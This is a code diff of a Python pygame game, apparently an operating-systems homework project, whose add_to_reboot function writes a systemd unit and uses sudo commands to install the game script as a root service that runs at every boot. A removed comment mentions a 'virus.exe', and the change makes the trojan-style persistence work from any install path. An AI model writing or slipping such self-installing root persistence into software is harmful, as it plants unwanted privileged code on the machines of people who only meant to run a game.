@@ -14,14 +14,18 @@ def display_score():
     return current_time
 
 def add_to_reboot():
-    exename='test.py'
-    path='/home/spr/Desktop/project/OS_home_work/'
-    # add name of virus.exe
+    if getattr(sys, 'frozen', False):
+        path = os.path.dirname(sys.executable)
+    elif __file__:
+        path = os.path.dirname(__file__)
 
-    f=open(path+'boot.service',"w")
+    exename='/test.py'
+    servicename='/boot.service'
+
+    f=open(path+servicename,"w")
     f.write("[Unit]\nDescription= StartUp\n\n\n[Service]\nExecStart="+path+exename+" start\nUser=root\nRemainAfterExit=yes\n\n\n[Install]\nWantedBy = multi-user.target\n")
     f.close()
-    os.system('sudo mv '+path+'boot.service /etc/systemd/system/') #put service with sys services
+    os.system('sudo mv '+path+servicename+' /etc/systemd/system/') #put service with sys services
     os.system('sudo systemctl --system daemon-reload')
     os.system('sudo chown root:root /etc/systemd/system/boot.service')
     os.system('sudo chmod 755 /etc/systemd/system/boot.service')
@@ -57,12 +61,6 @@ def game_over_screen(text1, text2, text3):
     text3_rectangle = text3_surface.get_rect(center=(400, 300))
     screen.blit(text3_surface, text3_rectangle)
 
-if getattr(sys, 'frozen', False):
-    game_path = os.path.dirname(sys.executable)
-elif __file__:
-    game_path = os.path.dirname(__file__)
-
-print(game_path)
 reboot = os.getenv("reboot")
 
 if reboot==None:
